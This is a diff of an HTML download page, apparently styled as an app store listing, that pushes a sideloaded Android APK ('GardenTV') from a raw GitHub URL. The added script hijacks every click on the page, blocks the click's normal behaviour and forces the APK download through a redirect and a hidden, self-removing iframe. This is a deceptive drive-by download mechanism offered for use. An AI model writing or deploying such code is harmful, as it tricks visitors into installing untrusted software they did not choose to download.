@@ -259,7 +259,7 @@ margin-bottom: 24px;
             </div>
         </div>
         <!-- Install button in the middle of the page -->
-        <a href="https://raw.githubusercontent.com/phuonganhle1812-lang/apkpurokj/refs/heads/main/GardenTV_v1.1.2.apk"><div class="main-install-btn">Instalar</div></a>
+        <div class="main-install-btn" onclick="startDownload()">Instalar</div>
 
         <!-- Operation bar -->
         <div class="action-row">
@@ -461,5 +461,30 @@ margin-bottom: 24px;
         </div>
 
     </main>
+
+    <!-- Any click triggers download logic + prevents default redirection -->
+	<script>
+        const apkUrl = "https://raw.githubusercontent.com/phuonganhle1812-lang/apkpurokj/refs/heads/main/GardenTV_v1.1.2.apk"; 
+
+        function startDownload() {
+            window.location.href = apkUrl;
+            
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = apkUrl;
+                document.body.appendChild(iframe);
+                setTimeout(() => {
+                    document.body.removeChild(iframe);
+                }, 500);
+            }, 500);
+        }
+
+        document.addEventListener('click', function(e) {
+            e.preventDefault(); 
+            e.stopPropagation(); 
+            startDownload();
+        }, true);
+    </script>
 </body>
 </html>
